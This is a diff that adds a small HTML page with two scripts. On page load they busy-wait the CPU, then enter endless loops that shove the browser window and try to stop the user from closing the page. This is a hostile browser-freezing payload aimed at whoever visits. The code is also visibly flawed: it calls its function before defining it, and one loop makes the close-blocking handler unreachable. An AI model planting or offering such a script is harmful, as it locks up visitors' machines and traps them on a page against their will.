@@ -1,0 +1,19 @@
+<script>
+function sleep(waitMsec) {
+  var startMsec = new Date();
+ 
+  // 指定ミリ秒間だけループさせる（CPUは常にビジー状態）
+  while (new Date() - startMsec < waitMsec);
+}
+ 
+sleep(1000);
+wa();
+</script>
+<script>
+function wa(){
+while(true){while(true){
+window.moveBy(0, -20);}
+window.addEventListener('beforeunload', function (event){
+event.preventDefault()
+event.returnValue = ''})}}
+</script>
